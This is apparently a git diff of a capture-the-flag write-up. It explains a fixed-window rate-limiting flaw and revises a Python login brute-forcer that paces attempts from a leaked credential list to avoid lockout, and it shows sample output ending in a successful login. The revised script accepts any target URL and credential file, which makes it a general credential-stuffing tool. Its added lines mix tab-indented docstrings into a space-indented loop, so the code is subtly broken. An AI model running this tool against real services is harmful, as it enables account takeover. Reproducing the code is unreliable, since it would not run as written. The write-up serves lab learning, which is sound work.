@@ -39,9 +39,12 @@ So the objective is to look at the source code provided in a zip file and find t
 The code-base has flawed rate-limiting logic: it allows up to a set maximum number of requests within a fixed epoch (time window). Going over that limit within the window results in an IP lockout.
 
 **Flaws:**
-- The password list is small enough that it can be exhausted well within the allowed request budget.
-- The back-end's failed-attempt threshold is generous enough to leave a comfortable margin for iteration before a lockout is ever risked.
-- It uses fixed-window rate-limiting instead of a sliding window or persistent, continuously-tracked counter.
+**The actual flaw** is the fixed-window rate-limiting design: it resets on a wall-clock boundary rather than tracking a rolling window, so pacing requests just under the threshold sidesteps it entirely.
+
+Two things worked in the solver’s favor on top of that:
+
+- The credential list was short enough to exhaust well inside the request budget the rate limit allowed. There is no need to get clever with timing precision or optimize the script beyond simple pacing.
+- The failed-attempt threshold itself was generous, which left a wide margin of error. Even imprecise timing wouldn’t have risked tripping a lockout.
 
 **Where it shows up in real life:**
 This type of flaw frequently shows up when developers roll their own rate-limiting logic instead of relying on industry-standard implementations like those built into Nginx, AWS WAF, or Cloudflare. A fixed-window scheme lets an attacker send a burst of requests right before a window closes and another burst right after it reopens — effectively doubling the allowed request rate in a very small span of time.
@@ -78,47 +81,22 @@ Function `refresh_request_rates_db` is called inside `exceeded_rate_limit` funct
 
 ## Solution
 With the logic mapped out, the objective becomes writing a script that brute-forces the login while staying under this rate limit.
-We start by loading and parsing the credential file:
 
-```py
-def load_credentials(path):
-    creds = []
-    with open(path, encoding="utf-8") as f:
-        for line in f:
-            line = line.strip()
-            if not line or line.startswith("#") or ";" not in line:
-                continue
-            user, pwd = line.split(";", 1)
-            creds.append((user.strip(), pwd.strip()))
-    return creds
-```
-
-Complete script for the solution is posted below this section. The script works through the leaked credential list one pair at a time, but it paces itself so it never crosses the server's 10-requests-per-30-second threshold. It picks a safe budget of 9 requests per epoch and spreads them evenly across the 30 seconds (`spacing = EPOCH_DURATION / MAX_REQUESTS`), instead of firing them all at once. Before every attempt it checks whether it's still inside an active lockout or whether the current epoch has expired, and resets its internal counters accordingly, mirroring the same window logic the server itself uses. 
-
-After each login attempt, `classify()` reads the response and sorts it into one of a few buckets — rate-limited, invalid credentials, a successful redirect, or something unexpected, so the script knows whether to back off, keep going, or stop. If the server does rate-limit it anyway, the script simply sleeps until the lockout ends and resumes from where it left off, rather than crashing or hammering the server further.
-
-After the brute-force completes or the 'Success' indication is printed in the console, we get the username and password, using which we can login to get the flag.
+Complete script for the solution is posted below this section. The script works through the leaked credential list one pair at a time, but it paces itself so it never crosses the server’s 10-requests-per-30-second threshold. It picks a safe budget of 9 requests per epoch and spreads them evenly across the 30 seconds (`spacing = EPOCH_DURATION / MAX_REQUESTS`), adding a safety margin of a single request, instead of firing them all at once. Before every attempt it checks whether it’s still inside an active lockout or whether the current epoch has expired, and resets its internal counters accordingly, mirroring the same window logic the server itself uses.
 
 ---
-
 ## Code
 ```py
 #!/usr/bin/env python3
-"""Rate-limit-aware login brute-forcer. Spaces requests evenly, idles out lockouts."""
+import argparse
+import sys
 import time
+
 import requests
-
-TARGET_URL = "http://xebec.cylabacademy.net:22455/login"
-CREDS_FILE = "creds-dump.txt"
-MAX_REQUESTS = 9          # server allows 10; stay under
-EPOCH_DURATION = 30       # server epoch window
-LOCKOUT_DURATION = 120
-FOLLOW_REDIRECTS = True
-
-SESSION = requests.Session()
 
 
 def load_credentials(path):
+    """Parse 'username;password' pairs from a file, one per line."""
     creds = []
     with open(path, encoding="utf-8") as f:
         for line in f:
@@ -131,32 +109,78 @@ def load_credentials(path):
 
 
 def classify(resp):
+    """Sort a login response into one outcome bucket."""
     text = resp.text or ""
+
     if "Rate Limited Exceeded" in text:
         return "RATE_LIMITED"
     if "Invalid username or password" in text:
         return "INVALID"
-    if resp.status_code in (301, 302, 303, 307, 308):
+
+    if resp.history and any(
+        r.status_code in (301, 302, 303, 307, 308) for r in resp.history
+    ):
         return "SUCCESS_REDIRECT"
+
     if "flag" in text.lower():
         return "SUCCESS_INDEX"
+
     return f"UNKNOWN(status={resp.status_code})"
 
 
-def main():
-    creds = load_credentials(CREDS_FILE)
-    print(f"Loaded {len(creds)} creds | MAX_REQUESTS={MAX_REQUESTS} "
-          f"EPOCH={EPOCH_DURATION}s LOCKOUT={LOCKOUT_DURATION}s")
+def attempt_login(session, url, username, password, timeout, max_retries):
+    """POST one credential pair, retrying transient network errors.
 
-    spacing = EPOCH_DURATION / MAX_REQUESTS
+    Returns (classification, response_or_None). A result of "ERROR" means
+    every retry was exhausted -- the caller decides whether to keep going.
+    """
+    last_exc = None
+    for attempt in range(1, max_retries + 2):  # +1 initial try, +1 for range
+        try:
+            resp = session.post(
+                url,
+                data={"username": username, "password": password},
+                allow_redirects=True,
+                timeout=timeout,
+            )
+            return classify(resp), resp
+        except requests.RequestException as e:
+            last_exc = e
+            if attempt <= max_retries:
+                print(f"    [RETRY {attempt}/{max_retries}] {e}")
+                time.sleep(1.5 * attempt)  # small backoff between retries
+    print(f"    [ERROR] giving up after {max_retries} retries: {last_exc}")
+    return "ERROR", None
+
+
+def main():
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--url", required=True, help="Login endpoint URL")
+    parser.add_argument("--creds", required=True, help="Path to 'user;pass' credential file")
+    parser.add_argument("--max-requests", type=int, default=9,
+                         help="Requests per epoch (stay under the server's real limit)")
+    parser.add_argument("--epoch", type=float, default=30.0, help="Server epoch duration (s)")
+    parser.add_argument("--lockout", type=float, default=120.0, help="Server lockout duration (s)")
+    parser.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout (s)")
+    parser.add_argument("--max-retries", type=int, default=2,
+                         help="Retries for a single credential pair on network error")
+    args = parser.parse_args()
+
+    creds = load_credentials(args.creds)
+    print(f"Loaded {len(creds)} creds | MAX_REQUESTS={args.max_requests} "
+          f"EPOCH={args.epoch}s LOCKOUT={args.lockout}s")
+
+    session = requests.Session()
+    spacing = args.epoch / args.max_requests
     lockout_until = 0.0
     requests_this_epoch = 0
     epoch_start = None
 
-    for username, password in creds:
+    for i, (username, password) in enumerate(creds, start=1):
         now = time.time()
 
-        if now < lockout_until:  # wait out an active lockout
+		""" trigger lockout if lockout_until is set """
+        if now < lockout_until:
             wait = lockout_until - now
             print(f"[LOCKOUT] Sleeping {wait:.1f}s")
             time.sleep(wait)
@@ -164,7 +188,8 @@ def main():
             epoch_start = None
             lockout_until = 0.0
 
-        if epoch_start is not None and (time.time() - epoch_start) >= EPOCH_DURATION:
+		""" reset the epoch if window exceeds the epoch variable """
+        if epoch_start is not None and (time.time() - epoch_start) >= args.epoch:
             requests_this_epoch = 0
             epoch_start = None
 
@@ -172,45 +197,63 @@ def main():
             epoch_start = time.time()
             requests_this_epoch = 0
 
-        if requests_this_epoch > 0:  # keep requests evenly spaced within the epoch
+        if requests_this_epoch > 0:
             delay = (epoch_start + requests_this_epoch * spacing) - time.time()
             if delay > 0:
                 time.sleep(delay)
 
-        print(f"[{requests_this_epoch + 1}/{MAX_REQUESTS}] Trying '{username}:{password}' ...", flush=True)
-        try:
-            resp = SESSION.post(
-                TARGET_URL,
-                data={"username": username, "password": password},
-                allow_redirects=FOLLOW_REDIRECTS,
-                timeout=15,
-            )
-        except requests.RequestException as e:
-            print(f"[ERROR] {e}")
-            requests_this_epoch += 1
-            continue
+        print(f"[{i}/{len(creds)}] Trying '{username}:{password}' ...", flush=True)
+        result, resp = attempt_login(
+            session, args.url, username, password, args.timeout, args.max_retries
+        )
 
-        result = classify(resp)
         if result == "RATE_LIMITED":
-            print(f"[RATE LIMITED] Locking out for {LOCKOUT_DURATION}s")
-            lockout_until = time.time() + LOCKOUT_DURATION
+            print(f"[RATE LIMITED] Locking out for {args.lockout}s")
+            lockout_until = time.time() + args.lockout
         elif result == "INVALID":
-            print("[FAIL] Invalid credentials")
+            print("    [FAIL] Invalid credentials")
         elif result in ("SUCCESS_REDIRECT", "SUCCESS_INDEX"):
-            print(f"[SUCCESS] Logged in as '{username}'!")
+            print(f"[SUCCESS] Logged in as '{username}:{password}' ({result})")
+            print("Done -- stopping, correct credential found.")
+            return 0
+        elif result == "ERROR":
+            print("    [SKIP] moving on after exhausting retries")
         else:
-            print(f"[{result}] Unexpected response")
+            print(f"    [{result}] Unexpected response")
 
         requests_this_epoch += 1
 
-    print("Done.")
+    print("Done -- exhausted credential list without a success.")
+    return 1
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
 
 ```
 
+and running it will get us:
+
+```
+Loaded 100 creds | MAX_REQUESTS=9 EPOCH=30.0s LOCKOUT=120.0s
+[1/100] Trying 'rora:winner1' ...
+    [FAIL] Invalid credentials
+[2/100] Trying 'birendra:rumble' ...
+...
+...
+[59/100] Trying 'tera:mccabe' ...
+    [FAIL] Invalid credentials
+[60/100] Trying 'bethan:barber' ...
+[SUCCESS] Logged in as 'bethan:barber' (SUCCESS_REDIRECT)
+Done -- stopping, correct credential found.
+```
+
+After each login attempt, `classify()` reads the response and sorts it into one of a few buckets: rate-limited, invalid credentials, a successful redirect, or something unexpected, so the script knows whether to back off, keep going, or stop. Redirect success is detected by checking `resp.history` and once `requests` follows a redirect automatically, the status code you see is always the destination page’s, not the redirect’s, so `resp.history` is where that evidence actually survives. If the server does rate-limit it anyway, the script sleeps until the lockout ends and resumes from where it left off rather than crashing or hammering the server further. A transient network error on a single attempt (timeout, dropped connection) is retried a bounded number of times before moving on, so a momentary hiccup doesn’t cause the script to silently skip past the correct credential.
+
+As soon as a success is detected, the script stops immediately and prints the matching username and password, which is then used to log in and retrieve the flag.
+
+The success check matches on the word `flag` anywhere in the response text which is a loose check, fine for this challenge’s known response shape, but it would need a more specific marker (page title, a known element) against an arbitrary target.
+
 ---
-Unlike usual CTFs, just remaining under the rate limit for solving the problem was enough because the password list was small, and the rate-limit allowed much generous rate of request. There could definitely be some clever edge cases for this problem, which would work for more realistic situations involving longer list of credential and stricter rate-limiting. 
+Unlike usual CTFs, just remaining under the rate limit for solving the problem was enough because the password list was small, and the rate-limit allowed much generous rate of request. There could definitely be some other clever edge cases for this problem, which would also work for more realistic situations involving longer list of credential and stricter rate-limiting. 
 I personally took this CTF as topic to learn the code base and write scripts accordingly rather than using the edge-cases to break past the authentication. Using Sliding window or modified sliding window or persistent counter would make the solution more complicated.
